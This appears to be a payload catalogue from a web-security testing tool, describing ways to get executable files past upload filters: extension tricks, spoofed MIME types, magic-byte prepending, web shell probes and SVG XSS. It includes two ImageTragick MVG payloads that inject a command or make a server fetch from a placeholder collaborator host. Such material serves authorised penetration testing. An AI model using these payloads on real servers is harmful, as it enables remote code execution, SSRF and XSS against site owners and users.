extension_bypass.description: File extension bypass techniques to upload executable files past extension filters

payloads.description: Double extension — Apache may execute as PHP if AddHandler is misconfigured
Null byte truncation — strips .jpg before saving (PHP < 5.3.4)
Mixed case extension — bypasses case-sensitive blacklists
Alternative PHP extension — often not blacklisted
Legacy PHP extension — parsed as PHP by default Apache configs
Trailing dot — Windows strips it, leaving .php
NTFS alternate data stream — Windows IIS bypass
Semicolon extension — IIS6 treats as .php
Trailing space — some systems strip whitespace after saving
Server-Side Include extension — executes SSI directives
Double extension for Java servers
Semicolon extension bypass for ASP.NET/IIS

content_type_bypass.description: Content-Type header manipulation to bypass MIME-type validation

payloads.description: Set MIME to image/jpeg while uploading PHP — bypasses Content-Type checks
Set MIME to image/png while uploading JSP
Set MIME to image/gif while uploading ASPX
Generic binary MIME type — often whitelisted
Plain text MIME — may bypass image-only checks
Two Content-Type headers — parser may use first while server uses second

magic_bytes.description: Magic byte prepending to pass file signature validation while keeping payload executable

payloads.description: GIF header + PHP — passes GIF magic byte check, executes as PHP
PNG header + PHP — passes PNG signature validation
JPEG header + PHP — passes JPEG/JFIF magic byte check
PDF header + PHP — passes PDF signature check
GIF header + XSS — stored XSS via image rendering

web_shells.description: Minimal web shell payloads for various server-side languages

payloads.description: PHP echo test — confirms PHP execution without harmful commands
PHP short tag echo — bypasses <?php keyword filters
JSP echo test — confirms JSP execution
JSP expression tag — alternative syntax
Classic ASP echo test
ASPX echo test — confirms ASP.NET execution
PHP with halt_compiler — minimal footprint, stops further parsing

svg_xss.description: SVG files containing XSS payloads — browsers render SVGs and execute embedded JavaScript

payloads.description: SVG onload XSS — simplest SVG XSS payload
SVG with embedded script element
SVG use element with data URI — advanced XSS
SVG animate element XSS — less commonly filtered
SVG set element XSS — another uncommon event handler

imagemagick.description: ImageTragick/ImageMagick RCE via crafted image files (CVE-2016-3714 class)

payloads.payload:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://COLLABORATOR_URL/im|id; )'
pop graphic-context
payloads.description: ImageTragick MVG RCE via fill url() directive
ImageMagick MSL command injection

payloads.payload:
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://COLLABORATOR_URL/'
pop graphic-context
payloads.description: ImageTragick SSRF via image fetch
